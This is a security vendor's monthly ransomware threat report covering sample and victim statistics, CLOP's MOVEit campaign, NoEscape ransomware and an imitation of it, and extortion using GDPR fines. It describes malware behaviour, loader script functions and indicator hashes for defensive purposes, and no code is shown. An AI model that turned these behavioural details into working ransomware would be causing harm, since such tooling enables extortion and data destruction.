Threat Trend Report on Ransomware (September 2023) 
5 
Objectives and Scope 
This report provides statistics on the number of new ransomware samples, targeted systems, 
and targeted businesses in September 2023, as well as notable ransomware issues in Korea 
and other countries. Other major issues and statistics for ransomware that are not mentioned 
in the report can be found by searching for the following keywords or via the Statistics menu 
at AhnLab Threat Intelligence Platform (hereinafter "ATIP"). 
 
⚫ Ransomware 
⚫ Statistics by Type 
 
Disclaimer: The number of ransomware samples and targeted systems are based on the 
detection names designated by AhnLab, and the statistics on targeted businesses are based 
on the time the information on the ransomware group's dedicated leak sites (DLS, identical to 
ransomware PR sites or PR pages) was collected by the ATIP infrastructure. 
 
 
 
Major Statistics 
1) Data Sources and Collection Methods 
ATIP uses its internal infrastructure to monitor and analyze the following ransomware 
information. 
 
⚫ List of malicious files and behaviors detected and collected by AhnLab Smart Defense 
(ASD) 
⚫ List of targeted businesses posted on ransomware groups' DLS 
 
The number of new ransomware samples and statistics on targeted systems were calculated 
based on the detection names designated by AhnLab. They were also limited to cases where 
the detected files and behaviors were diagnosed under the category of "Ransomware/" or 
"Ransom/". 
 
Threat Trend Report on Ransomware (September 2023) 
6 
⚫ Ransomware/Win.Magniber: Example file detection name 
⚫ Ransom/MDP.Magniber: Example behavior detection name 
 
The detection names acquired at the time of detection may not allow for the identification of 
ransomware types (e.g. Generic, Agent, Edit, Decoy, and others), and some cases may be 
excluded from the ransomware statistics or be counted as a different ransomware type due 
to changed detection names after detection or a failed detection. 
 
The statistics on targeted businesses are the values that have been organized based on the 
data accumulated through regular monitoring of ransomware groups' DLS, where the groups 
reveal the targeted businesses. If the DLS page was inaccessible or the collection happened 
late, then the data may have been excluded from the statistics or have been considered to be 
collected at a time different from the exact date the victim was revealed. 
 
Therefore, this report should be used as a reference to check the general trends of 
ransomware samples and targeted systems and to see which ransomware groups are actively 
engaged in attacks through the statistics on targeted businesses to gain a general 
understanding of trends. 
 
 
2) Overall Ransomware Statistics 
The total number of new ransomware samples collected during the past six months is as 
follows. 
 
 
Figure 1. Number of new ransomware samples 
Threat Trend Report on Ransomware (September 2023) 
7 
The number saw a spike due to Magniber in February 2023 but was decreased in March. 
However, it steadily increased again before dropping drastically in August. It then went 
through a further substantial drop in September, with approximately 64% fewer samples 
(roughly 2,200) compared to the previous month. The decline in August samples was primarily 
due to Magniber. In September, the significant drop in sample numbers was mainly attributed 
to the sharp decrease of approximately 2,000 samples in Azov, AzovCrypt, Stop, and 
StopCrypt ransomware compared to the previous month. 
 
The table below shows the total numbers after removing redundant data of ransomware files 
used in targeted systems and infection. (The term "targeted systems" is used for your 
convenience, yet it should be understood as systems where ransomware files and behaviors 
were detected or systems that were exposed to infections.) 
 
 
Figure 2. Systems and files affected by ransomware 
 
The statistics for affected systems have decreased by 46% compared to the previous month, 
resulting in the lowest number of affected systems since statistics started being compiled, 
with a total of 353 cases. This continuous decrease is attributed to a significant reduction in 
the distribution of Magniber samples, which previously accounted for the majority of affected 
systems. 
 
The total number of ransomware behavior detection (MDP)-based targeted systems and 
blocked report cases are as follows. 
 
Threat Trend Report on Ransomware (September 2023) 
8 
 
Figure 3. Ransomware behavior detection-based targeted systems and reports 
 
In contrast to the aforementioned file detection-based statistics, the statistics for behavior 
detection systems have decreased even further compared to the last month by more than 
61%. Like the file detection-based statistics, this decrease in targeted systems based on 
behavior detection is believed to be attributed to the Magniber samples which have also been 
experiencing a consistent decrease. 
 
 
3) New Samples by Ransomware 
Below are the statistics showing the 1,276 new samples that were discovered in September 
organized by ransomware type. Only 20 ransomware with the most samples are shown. 
 
 
Figure 4. Number of new samples per ransomware (September 2023) 
 
Threat Trend Report on Ransomware (September 2023) 
9 
As mentioned in the total ransomware statistics, the number of Magniber samples has 
maintained a decreasing trend from 169 samples in the previous month to 100 samples, and 
the number of Azov, AzovCrypt, Stop, and StopCrypt samples has decreased by approximately 
2,000 compared to the previous month, resulting in an overall decrease in the number of new 
ransomware samples. 
 
 
4) Targeted Systems by Ransomware 
The top 20 cases with the highest number of files used in targeted systems and infection are 
as follows (duplicates have been excluded). 
 
 
Figure 5. Number of targeted systems and files by ransomware (September 2023) 
 
The number of systems targeted by Magniber decreased from 467 to 184, marking a 60% 
sharp decline. On the other hand, other ransomware numbers remained at a similar level to 
that of the previous month. 
 
The following statistics show the daily number of affected systems from the top 12 
ransomware out of the total affected systems. 
 
Threat Trend Report on Ransomware (September 2023) 
10 
 
Figure 6. Daily numbers of targeted systems by ransomware (September 2023) 
 
The decrease in Magniber was also reflected in the daily statistics. The daily average of 
systems affected by Magniber decreased significantly to 10 or below cases per day. Typical 
fluctuations such as the slight decrease in attacks during weekends and subsequent increase 
during weekdays remained the same. The significant decrease in the distribution of Magniber 
samples which was observed in the statistics starting from August has continued into 
September, indicating an overall decline. Despite the low quantity, a shift in the distribution 
method from the .MSI format to .CPL format files has been observed, reminiscent of 
Magniber's activity from the previous year. 
 
 
5) Targeted Businesses by Ransomware Group 
Below are the statistics on targeted businesses posted on the ransomware groups' dedicated 
leak sites (DLS) collected by ATIP. As data on some ransomware groups were collected late or 
could not be collected, the report refers to the table "Targeted Businesses by Ransomware 
Group (External Statistics)" that follows as well. 
 
Threat Trend Report on Ransomware (September 2023) 
11 
 
Figure 7-1. Number of targeted businesses per ransomware group (September 2023) 
 
 
Figure 7-2. Number of targeted businesses per ransomware group - daily (September 2023) 
 
Although the number of companies affected by LOCKBIT 3.0 decreased by about 32% 
compared to the previous month, it is still at the top of the ATIP statistics. The group has 
consistently exposed a significant number of affected companies on its DLS. 
 
Additionally, the ransomware groups Inc_Ransom, Metaencryptor, and RansomedVC, which 
are indicated below the center of the daily targeted businesses graph, have the cumulative 
data collected from targeted companies disclosed prior to September. As a result, these 
groups may rank higher in the ATIP statistics than their actual ranks. Newly monitored 
Threat Trend Report on Ransomware (September 2023) 
12 
ransomware groups that are added to the list will have their accurate number of targeted 
companies reflected in the statistics from the following month. 
 
Some of the targeted businesses revealed per ransomware group are as follows. 
 
 
Table 1. Some of the targeted businesses per ransomware group (September 2023) 
 
 
6) Targeted Businesses by Ransomware Group (External 
Statistics) 
The statistics on targeted businesses during the same period were provided by Dailydarkweb 
Twitter, run by an external TI business or security expert, and this can be seen below. Note that 
this report used the statistical information from DarkFeed or Dailydarkweb Twitter available 
at the time of writing. 
 
Threat Trend Report on Ransomware (September 2023)

Figure 8. Targeted businesses per ransomware group <Source> Dailydarkweb Twitter 
 
As mentioned above, excluding the ransomware groups with cumulative statistics in ATIP for 
September, the number of businesses targeted by LOCKBIT 3.0, BlackCat (ALPHV), Cactus, 
NoEscape, and other ransomware groups that disclose many targeted businesses is generally 
high. Additionally, the LostTrust ransomware group listed about 50 targeted businesses at the 
end of September. It employs a DLS design and ransomware similar to the Metaencryptor 
ransomware group, suggesting a high likelihood of LostTrust being a rebrand of 
Metaencryptor. 
 
 
Key Trends 
Multiple issues regarding various ransomware occurred in September 2023. This report 
presents brief introductions to the following key topics and details for reference. 
 
Threat Trend Report on Ransomware (September 2023) 
14 
⚫ Sharp decrease in targeted businesses related to CLOP ransomware and MOVEit 
⚫ NoEscape ransomware and its imitations 
⚫ Ransomware group using GDPR as a bluff (GDPR Gambit) 
 
Readers are recommended to check and refer to issues that are not covered in this report 
through ATIP if the current security management system or situation requires so. 
 
 
1) Sharp Decrease in Targeted Businesses Related to CLOP 
Ransomware and MOVEit 
In relation to the issue of "CLOP ransomware's activities involving the exploitation of the 
MOVEit zero-day vulnerability and the group's disclosure of their victims" covered in 2023 
June, July, and August ATIP Threat Trend Reports on Ransomware, 1 , 2 , 3 the number of 
additional targeted businesses disclosed in the group's DLS sharply decreased to just one in 
September, as shown in the figure below. In September, there were no targeted businesses 
registered on the CLOP torrent site. 
 
 
Figure 9. Post on CLOP ransomware's DLS/torrents - Disclosure of victims (September 30th)

3 https://asec.ahnlab.com/en/57944/ 
Threat Trend Report on Ransomware (September 2023) 
15 
After about 4 months of the ongoing "CLOP ransomware's activities involving the exploitation 
of the MOVEit zero-day vulnerability and the group's disclosure of their victims" issue with 
approximately 180 targeted businesses in July, it appears that the topic is coming to a close 
as the number of new cases decreased rapidly to 4 in August and 1 in September. 
 
In the absence of any noteworthy analysis reports or articles on CLOP from Korean and 
international security companies or related media, it is reasonable to conclude that the CLOP 
issue related to MOVEit is coming to an end. However, it is important to remain vigilant for the 
possibility of new activities. If the patch for the MOVEit vulnerability has not been applied, there 
is still a risk of similar attacks, so it is essential to ensure that the patch is installed for products 
using MOVEit. 
 
To prevent ransomware attacks, it is essential for organizations and users who use software 
that can be directly used in malware infection such as file transfer tools to apply the latest 
security updates and remove unnecessary software. Users should also follow the general 
guidelines of practicing periodic backups, as well as installing, using, and updating security 
software. 
 
 
2) NoEscape Ransomware and Its Imitations 
The NoEscape ransomware gang was first discovered in May 2023 when it posted an affiliate 
recruitment post for ransomware-as-a-service (RaaS) on a cybercrime forum. In this post, the 
gang claims to support various platforms (Windows, Linux, and VMware ESXi) and provide 
advanced ransomware features including an automated admin panel. It explicitly mentions 
that it does not allow ransomware attacks against CIS (former Soviet Union) countries. One 
month later, the ransomware gang's dedicated leak sites (DLS) were confirmed in June 2023. 
There was one website for negotiating with the victims and the other for releasing leaked data. 
The gang has targeted various countries and industries with its ransomware attacks. The 
gang's tactic involves leaking data before encrypting it, and in cases where negotiations break 
down or victims do not comply, its members use a double extortion tactic by making the data 
public. This ransomware gang is known to be a rebrand of the now inactive Avaddon 
ransomware.

Cyble posted an article on its blog titled "Low-profile Threat Actor observed imitating 
NoEscape Ransomware" on September 4th.4 As characterized in the article's title as "low-
profile", the threat actor (TA) who is believed to have imitated NoEscape did not attract much 
attention or interest from the public and the media. However, it has been deemed as being a 
good starting point for examining the NoEscape ransomware, so it will be briefly covered here. 
 
Before introducing the sample covered by Cyble that imitated the NoEscape ransomware, we 
will examine a NoEscape example that operates on various platforms such as Windows, Linux, 
and VMware ESXi. 
 
First, we will briefly look into the behaviors and characteristics of the sample that corresponds 
to the MD5 below, which is a PE32 file that operates in Windows environments. 
 
⚫ 
BD69A645FA69FD8D5BA56B9C3F468711 // PE32 NoEscape Ransomware 
 
When NoEscape is executed, it appends the ".ECEIGJGEJF" extension to encrypted files as 
shown below (the added extension may vary depending on samples but usually consists of a 
10-character 
string). 
It 
also 
creates 
a 
ransom 
note 
with 
the 
file 
name 
"HOW_TO_RECOVER_FILES.txt" in the encrypted directory. Once the file encryption process is 
complete for the entire file system, NoEscape changes the desktop background and opens 
the ransom note that was created on the desktop using notepad.exe to inform the user of the 
infection and then terminates itself. 
 
In a test where a system was left in the infected state, dozens of notepad.exe windows with 
the ransom note were observed to have been opened after several hours had passed. This 
behavior indicates that the sample had been registered in the task scheduler under the name 
"SystemUpdate" and was set to run every 10 minutes.

The ransom note, "HOW_TO_RECOVER_FILES.txt", does not differ much from a typical ransom 
note. It includes the .onion address of the "negotiation platform for victims" among the 2 types 
of DLS mentioned above in the NoEscape threat actor description, as well as the individual 
negotiation ID required for login referred to as the "personal ID". 
 
Threat Trend Report on Ransomware (September 2023)

Figure 12. NoEscape ransomware ransom note - HOW_TO_RECOVER_FILES.txt 
 
Access to the "negotiation platform for victims" page was attempted following the ransom 
note shown above, but the content of the negotiation page could not be viewed due to an 
"Invalid ID". It is suspected to be a page with chatting functionality or a page for submitting 
additional information to the threat actor from the targeted business.

Following Windows, we will examine an example that operates on platforms such as Linux and 
VMware ESXi. 
 
Among the NoEscape ransomware IOCs collected through OSINT such as MalwareBazaar and 
VirusTotal, we will now briefly examine the behaviors and characteristics of the NoEscape 
ransomware through the ELF 64-bit file that operates by targeting Linux and VMware ESXi 
platforms, as well as the shell script file that performs the role of loading the ransomware. 
 
⚫ 
C850F6816459E3364B2A54239642101B // ELF 64-bit NoEscape Ransomware (164f8295_linux.elf)

⚫ 
34DE9725E232BA82275BB0DCF9282E16 // Shell Script – Loader for VMware ESXi (script_esxi.sh) 
 
First, the shell scripts responsible for initiating the infection in Linux and VMware ESXi 
environments are structured as shown below. While they vary in functionality with each 
variant, they are primarily designed for pre-infection preparations, ransomware execution, 
and post-processing to optimize infections in Linux and VMware ESXi environments. The table 
below is a summarized version with only the function names and most of the script code 
omitted for reference.

Code 1. NoEscape ransomware shell scripts - loader comparison (left: Linux, right: ESXi) 
 
The above two shell scrips operate in the "/tmp" path. Upon execution, they run the NoEscape 
ransomware with the file name "164f8295_linux.elf" by using the path provided as a command 
argument or the path contained in the "TARGET_PATH" variable defined within the script 
("/home" or "/vmfs/volumes") as an argument. 
 
The ScanXXX() function performs file encryption on the Path, NFS, and VMS that corresponds 
with the XXX. Descriptions for other functions are omitted as they can be inferred from their 
names. 
 
As a result of placing "script_linux.sh" and "164f8295_linux.elf" in the "/tmp" path and running 
them with an arbitrary path set as an argument in a Linux environment, the encryption process 
triggered by "script_linux.sh" is outputted and the encrypted files have the ".BJDGAIHFHB" 
extension added to them as shown below. Like in the Windows environments, a ransom note 
with the file name "HOW_TO_RECOVER_FILES.txt" is created in the encrypted directory.

Figure 15. Files before and after .BJDGAIHFHB file encryption via NoEscape ransomware 
 
During the testing of the NoEscape ransomware, two files "index.html" and "motd" were 
generated in the currently working directory (CWD). The content of these files was identical 
to the ransom note, excluding the HTML tag information. These appear to be utilized to 
manipulate the pages of web servers and terminal messages in Linux and VMware ESXi 
environments to show that the system in question has been successfully infected. This 
feature is similar to the Deface() function in the Shell Script - Loader for VMware ESXi 
(script_esxi.sh), which operates in the VMware ESXi environment.

Now, we will return to the content mentioned in the post published by Cyble titled "Low-profile 
Threat Actor observed imitating NoEscape Ransomware", which was what started this topic. 
Unfortunately, the company did not provide all the necessary IOC information for analysis. As 
an alternative, we will proceed with the explanation by obtaining a similar file through the 
OSINT and refer to the Cyble post for details.

If the annotations are removed from the two samples with the file name README.txt.bat that 
were disclosed as IOCs, you can see the batch files with the same features as shown below.

These batch files perform the task of connecting to the SMB server set by the malware 
developer with hard-coded credentials and using PowerShell to download and execute the 
shared "combined.ps1" file. The "combined.ps1" file, which performs actual ransomware 
features, has not had its IOC publicly disclosed, so a similar file was reviewed. This file is 
believed to be a previous version of the actual file used in attacks or a modified file for testing. 
 
The "combined.ps1" file consists of three code blocks, and each block contains the following: 
[1] an established extension-based file exfiltration feature, [2] a ransomware encryption 
feature (which does not work or is for testing purposes), and [3] a feature that displays the 
ransom note on the screen. The following is a summarized excerpt of the script code for 
reference.

Code 3. combined.ps1 similar to NoEscape imitation ransomware 
 
Threat Trend Report on Ransomware (September 2023) 
25 
Files provided by the SMB server such as "null.txt" and "RANSOM.txt" could not be acquired. 
Up to this point, the opinion that this is an imitation of the NoEscape ransomware may seem 
puzzling. However, this speculation is explained by how similar the content of the ransom note 
"RANSOM.txt" is to the one used by NoEscape. Nonetheless, the specific content of the 
ransom note and the banner format of the NoEscape string at the top are quite different. In 
particular, the ransom note refers to the targeted organization as "college" and instructs users 
to send 30 coins to the threat actor's Bitcoin address instead of listing a separate .onion 
address and notice on "personal ID". This shows how the previous evidence is not sufficient to 
compellingly suggest that the malware is an imitation of NoEscape. 
 
 
Figure 17. NoEscape ransomware ransom note imitation <Source> cyble.com  
 
The NoEscape ransomware is known as a rebranding of the Avaddon ransomware, and this is 
concrete proof that ransomware operators are editing existing codes to develop unique 
ransomware to find more effective attack tools for extorting financial gains from their victims. 
To minimize harm from such attack methods, organizations and individual users must comply 
with security guidelines, such as applying the latest security updates, removing unnecessary 
software, practicing periodic backups, as well as installing, using, and updating security 
software.

3) Ransomware Group Using GDPR as a Bluff (GDPR Gambit) 
GDPR stands for General Data Protection Regulation, which is a law introduced in the European 
Union (EU) and European Economic Area (EEA) countries to strengthen the protection and 
processing of personal data. This regulation has been in effect since May 25th, 2018, and 
violations can result in administrative penalties such as fines. Even if a company does not have 
a physical presence in the EU, it may still be subject to the GDPR if it conducts business 
targeting the EU, making it important for such companies to exercise caution. 
 
Additionally, South Korea also has a regulation that serves a similar purpose to the GDPR 
known as the "Personal Information Protection Act". This law regulates the collection, 
processing, protection, and use of personal information with the aim of protecting the rights 
of individuals. 
 
KELA published a report titled "GDPR Gambit: The new favorite of Ransomware and Extortion 
Actors?” on September 6th, which discusses the use of GDPR fines and administrative 
penalties as a means of pressuring victim companies to increase the likelihood of them paying 
ransom when faced with data breaches.5 
 
According to the report, some ransomware threat actors in the past would explicitly mention 
the GDPR in their ransom notes and blogs to pressure victims in the European region. Now in 
2023, a trend emerged where a majority of ransomware threat actors began subtly using the 
GDPR as a means of pressure. Among these ransomware groups, BlackCat/ALPHV and 
NoEscape displayed this tendency most noticeably. BlackCat/ALPHV primarily targets the 
United States, while NoEscape is known to use GDPR pressure tactics on individual businesses 
targeted for attacks. 
 
Additionally, GDPR fines are divided into two tiers based on the severity of the violation. In the 
case of a severe violation, fines can be as high as €20 million (approximately $21 million) or up 
to 4% of the company's total worldwide annual revenue from the previous fiscal year,

depending on which is higher (Source: https://gdpr.eu/fines/). 
 
As for RansomedVC ransomware which is mentioned as one of the groups using GDPR 
pressure tactics, the recent interview with its creator was covered in the media with the title 
"Inside the Mind of a Ransomware Operator: Ransomed.vc Ransomware Gang Interview".6 In 
this interview, there was a question about using GDPR fines as a means of pressure, and the 
creator responded by suggesting that using GDPR fines as leverage can be advantageous in 
negotiations with targeted companies. 
 
As mentioned in this interview, the RansomedVC ransomware gang's DLS page mentions the 
GDPR at the top of its page. The overall content is in the figure below, and the last sentence, 
"In cases where payment is not received, we are obligated to report a Data Privacy Law 
violation to the GDPR agency!" applies a fair amount of pressure on targeted companies. 
 
 
Figure 18. Notice at the top of RansomedVC ransomware's DLS 
 
In order to view how often GDPR is being mentioned by ransomware groups and on the 
DeepWeb/DarkWeb (DDW), the following search results of "GDPR" can be observed on ATIP.

Figure 19. Some of the results from searching "GDPR" on ATIP 
 
A majority of the search results are from the DLS of ransomware groups, with the following 
being search results example of BlackCat/ALPHV and NoEscape. While the two content varies 
slightly, the common theme is that not complying with negotiations will result in data leakage 
and reputation damage, with the criminals arguing that paying the ransom is more cost-
efficient than facing GDPR fines.

Many ransomware groups are using GDPR regulations in this subtle but potent way to 
pressure victims into paying the ransom to prevent data leakage. Both South Korean and 
global law enforcement authorities, as well as cybersecurity companies, do not recommend 
paying the ransom. If the ransom is paid, it is used by threat actors as illegal funds to recruit 
or mobilize affiliates (individuals or groups who act for the ransomware group and infiltrate 
victim companies to steal data or infect their systems with ransomware) to attack additional 
victims. 
 
Also, there is no guarantee that the attacker will keep the promise by deleting the data and 
not leaking it to others. The affected files may even not be decrypted. If your organization is 
the victim of data breach or ransomware attack, it is advised that you report the incident to 
organizations for cybercrime investigation.

Conclusion 
Although the number of ransomware samples and affected systems may change periodically 
depending on the success rate of attack campaigns or initial infection attempts, each month 
records at least hundreds or thousands of such cases as can be seen in the statistics herein. 
Also, hundreds of victimized companies are listed on ransomware groups’ leak sites. 
 
As described in this trend report, ransomware attack groups actively exploit the vulnerabilities 
of operating systems and software used by corporations. As for individual users, the threat 
groups take advantage of users' negligence, use malware carefully disguised as legitimate 
software, or exploit vulnerabilities that evade security software. According to the 
characteristics used in such initial infection attempts, corporate and individual users are 
advised to observe the following guidelines to protect and manage their major assets. 
 
⚫ Apply the latest security updates for operating systems and software. Enable auto-
update. 
⚫ Install and use security software. Maintain the latest updates. 
⚫ Back up data regularly and store said data in an offline or separate network. 
⚫ Be cautious of websites from unreliable sources and viewing/executing email links and 
attachments. 
⚫ Use strong passwords and two-factor authentication (2FA).
